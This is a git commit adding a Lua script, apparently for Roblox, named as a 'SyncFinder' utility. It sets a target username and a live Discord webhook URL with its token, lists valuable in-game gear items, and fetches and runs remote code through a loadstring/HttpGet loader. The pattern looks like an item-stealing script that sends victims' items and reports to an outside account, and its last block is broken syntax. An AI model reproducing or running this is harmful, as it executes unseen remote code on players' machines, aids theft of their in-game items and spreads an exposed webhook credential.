1ba0b3b8a2f26141ad3a694779265be9bbc171ce
sab-api <carlosignaa2019@gmail.com>
2026-09-20 15:07:13 -0300

    Add script SyncFinder_1789927632898.lua

---
+++ scripts/SyncFinder_1789927632898.lua
@@ -0,0 +1,40 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "juc5ao1235"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1551286656873799725/oOVXDSJ5KAR2vcguT8v4dXQFbrnZvceyhTAbIkwfSuCPoUTWrEnZ89X1cDfC3xTpiO89"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Flying Bee"] = true,
+    ["Crystal Slap"] = true,
+    ["Candy Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    Sync hub
+end)
